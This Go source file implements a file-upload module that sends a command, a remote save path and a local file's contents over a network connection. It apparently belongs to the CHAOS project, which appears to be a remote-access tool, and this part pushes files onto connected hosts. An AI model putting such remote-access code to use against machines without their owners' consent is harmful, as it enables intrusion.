package upload

import (
	"encoding/json"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/internal/util/os"
	c "github.com/tiagorlampert/CHAOS/pkg/color"
	"net"
)

type UploadUseCase struct {
	Connection net.Conn
}

func NewUploadUseCase(conn net.Conn) usecase.Upload {
	return &UploadUseCase{
		Connection: conn,
	}
}

func (u UploadUseCase) Validate(param []string) {
	if len(param) != 3 {
		fmt.Println(c.Yellow, "[!] Invalid parameters to upload!")
		return
	}
}

func (u UploadUseCase) Prepare(command string) {
	err := network.Send(u.Connection, []byte(command))
	if err != nil {
		fmt.Println(c.Red, "[!] Error sending upload request!")
	}

	data, err := network.Read(u.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response")
	}

	var response models.Response
	if err := json.Unmarshal(data, &response); err != nil {
		log.Error(err)
	}
	if response.Error {
		fmt.Println(c.Red, "[!] Error preparing upload!")
	}
}

func (u UploadUseCase) SendPath(savePath string) {
	err := network.Send(u.Connection, []byte(savePath))
	if err != nil {
		fmt.Println(c.Red, "[!] Error sending save path!")
	}

	data, err := network.Read(u.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response")
	}

	var response models.Response
	if err := json.Unmarshal(data, &response); err != nil {
		log.Error(err)
	}
	if response.Error {
		fmt.Println(c.Red, "[!] Error preparing upload! ", "Directory not found")
	}

	fmt.Println(c.Green, "[*] Directory validated successfully")
}

func (u UploadUseCase) SendFile(filepath string) {
	file, err := os.ReadFile(filepath)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading file")
	}

	if err = network.Send(u.Connection, file); err != nil {
		log.WithField("cause", err.Error()).Error("error sending file")
	}

	data, err := network.Read(u.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response")
	}

	var response models.Response
	if err := json.Unmarshal(data, &response); err != nil {
		log.Error(err)
	}
	if response.Error {
		fmt.Println(c.Red, "[!] Error sending file! %s", response.Message)
	}
}
